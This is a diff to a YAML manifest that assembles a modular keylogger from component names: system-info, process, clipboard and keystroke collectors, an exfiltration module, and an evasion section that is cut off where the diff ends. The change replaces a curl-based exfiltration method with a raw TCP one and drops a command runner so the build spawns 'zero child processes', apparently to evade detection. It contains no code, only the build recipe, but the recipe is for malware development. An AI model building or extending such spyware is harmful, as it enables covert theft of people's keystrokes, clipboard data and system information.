@@ -1,18 +1,17 @@
 name: keylogger
-description: Keylogger with system info, clipboard, and keystroke capture (poll-based)
+description: Keylogger with system info, clipboard, and keystroke capture — zero child processes
 
 core:
   - core/emit_buffer
-  - core/run_cmd
 
 collectors:
-  - collectors/system_info_stealth
+  - collectors/system_info_api
   - collectors/processes
   - collectors/clipboard
 
 keylogger: collectors/keylogger_poll
 
-exfil: exfil/curl_lolbin
+exfil: exfil/tcp_flush
 arch: arch/keylogger
 
 evasion:
